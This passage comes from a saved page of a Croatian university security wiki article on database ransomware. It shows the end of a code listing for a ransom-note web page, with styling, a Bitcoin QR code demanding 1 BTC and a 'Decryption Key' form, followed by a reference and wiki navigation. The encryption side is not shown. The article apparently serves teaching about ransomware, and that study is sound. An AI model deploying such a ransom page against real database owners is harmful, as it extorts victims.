+			.form .layout form input {
+				-webkit-appearance: none;
+				margin: 0;
+				padding: .2em .4em;
+				font-family: 'Armata', sans-serif;
+				font-size: 1em;
+				border: .07em solid #9D2A00;
+				-webkit-border-radius: 0;
+			}
+			.form .layout form input[type=&quot;submit&quot;] {
+				background-color: #FF4500;
+				color: #FFF;
+				cursor: pointer;
+				transition: background-color 220ms linear;
+			}
+			.form .layout form input[type=&quot;submit&quot;]:hover {
+				background-color: #D83A00;
+				transition: background-color 220ms linear;
+			}
+			.form .layout form .error {
+				margin: 0 0 1em;
+				color: #9D2A00;
+				font-size: .8em;
+			}
+			.form .layout form .error:not(:empty) {
+				margin: .2em 0 1em;
+			}
+			.form .pay {
+				background-color: rgba(0, 0, 0, .7);
+				display: flex;
+				flex-direction: column;
+				align-items: center;
+				position: absolute;
+				bottom: 0;
+				left: 0;
+				padding: .2em;
+				width: 225px;
+			}
+			.form .pay img {
+				margin: 0 0 .2em;
+				width: inherit;
+			}
+			.form .pay p {
+				margin: 0;
+				color: #FFF;
+			}
+		&lt;/style&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;div class=&quot;form&quot;&gt;
+			&lt;div class=&quot;pay&quot;&gt;
+				&lt;img src=&quot;https://chart.googleapis.com/chart?chs=225x225&amp;chld=L|2&amp;cht=qr&amp;chl=bitcoin:1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14?amount=1&quot; alt=&quot;1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14&quot;&gt;
+				&lt;p href=&quot;&quot;&gt;Pay 1 BTC!&lt;/p&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;layout&quot;&gt;
+				&lt;header&gt;
+					&lt;h1&gt;Ransomware&lt;/h1&gt;
+				&lt;/header&gt;
+				&lt;form method=&quot;post&quot; action=&quot;&quot;&gt;
+					&lt;label for=&quot;password&quot;&gt;Decryption Key&lt;/label&gt;
+					&lt;input name=&quot;key&quot; id=&quot;key&quot; type=&quot;text&quot; spellcheck=&quot;false&quot; autofocus=&quot;autofocus&quot;&gt;
+					&lt;p class=&quot;error&quot;&gt;&lt;?php echo $errorMessages['key'];&#160;?&gt;&lt;/p&gt;
+					&lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Decrypt&quot;&gt;
+				&lt;/form&gt;
+			&lt;/div&gt;
+		&lt;/div&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
+<p>Ransomware. Dostupno 24.1.2018. s <a href="https://en.wikipedia.org/wiki/Ransomware" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Ransomware</a>.
+</p>
+<!-- 
+NewPP limit report
+Preprocessor node count: 41/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:9908-0!*!0!!hr!*!edit=0 and timestamp 20190203204143 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Ransomware_za_bazu_podataka.html">http://security.foi.hr/wiki/index.php/Ransomware_za_bazu_podataka</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Ransomware_za_bazu_podataka" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Ransomware_za_bazu_podataka.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Ransomware_za_bazu_podataka&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Ransomware_za_bazu_podataka.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Ransomware_za_bazu_podataka.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Ransomware_za_bazu_podataka&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Ransomware_za_bazu_podataka&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Ransomware_za_bazu_podataka.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Ransomware_za_bazu_podataka" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Ransomware_za_bazu_podataka" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Ransomware_za_bazu_podataka&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Ransomware_za_bazu_podataka&amp;oldid=42965" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 14:08, 1. veljače 2018.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 120 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Ransomware_za_bazu_podataka", "wgTitle": "Ransomware za bazu podataka", "wgAction": "view", "wgArticleId": 9908, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 42965, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.317 secs. -->			</body>
+</html>
